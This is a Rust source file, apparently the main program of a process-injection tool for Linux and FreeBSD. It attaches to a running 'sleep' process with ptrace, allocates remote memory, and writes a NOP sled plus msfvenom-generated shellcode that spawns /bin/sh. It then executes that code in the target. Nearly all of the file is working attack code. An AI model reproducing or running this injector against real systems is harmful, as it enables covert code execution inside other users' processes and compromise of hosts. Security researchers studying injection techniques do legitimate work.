

mod inject;

use inject::common as common;
#[cfg(target_os = "linux")]
use inject::linux as injector;
#[cfg(target_os = "freebsd")]
use inject::freebsd as injector;

use libc::{ptrace, waitpid};

const PROCESS_NAME: &str = "sleep";

fn main() {

    // msfvenom -p linux/x64/exec -f rust
    let shellcode: [u8; 21] = [
        0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52,
        0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05,
    ];

    let mut payload = vec![];
    payload.append([0x90, 0x90, 0x90, 0x90, 0x90, 0x90].to_vec().as_mut());
    payload.append(&mut shellcode.to_vec());


    match common::get_process_id_by_name(PROCESS_NAME) {
        Some(pid) => {
            println!("Process {} has PID: {}", PROCESS_NAME, pid);
            unsafe {

                #[cfg(target_os = "linux")]
                ptrace(
                    injector::PTRACE_ATTACH,
                    pid,
                    injector::NULL_PTR,
                    injector::NULL_PTR,
                );

                #[cfg(target_os = "freebsd")]
                if ptrace(
                    injector::PTRACE_ATTACH,
                    pid,
                    injector::NULL_PTR,
                    injector::NULL_PTR as i32,
                ) == -1 {
                    println!("Error attaching to process: {}", std::io::Error::last_os_error());
                    return;
                }
                waitpid(pid, std::ptr::null_mut(), 0);
            };
            match injector::allocate_remote_memory(pid, payload.len()) {
                Ok(address) => {
                    println!("Allocated memory at address: 0x{:x}", address);
                    match injector::write_shellcode(pid, address + 8, &payload) {
                        Ok(_) => {
                            println!("{} bytes written successfully", payload.len());
                            match injector::execute_shellcode_at_address(address, pid) {
                                Ok(_) => println!("Shellcode executed"),
                                Err(e) => println!("Error executing shellcode: {}", e),
                            }
                        }
                        Err(e) => println!("Error writing shellcode: {}", e),
                    }
                    unsafe {
                        #[cfg(target_os = "linux")]
                        ptrace(
                            injector::PTRACE_DETACH,
                            pid,
                            injector::NULL_PTR,
                            injector::NULL_PTR,
                        );
                        #[cfg(target_os = "freebsd")]
                        ptrace(
                            injector::PTRACE_DETACH,
                            pid,
                            injector::NULL_PTR,
                            injector::NULL_PTR as i32,
                        );
                    }
                }
                Err(e) => println!("Error allocating memory: {}", e),
            }
        }
        None => println!("Process {} not found", PROCESS_NAME),
    }
}
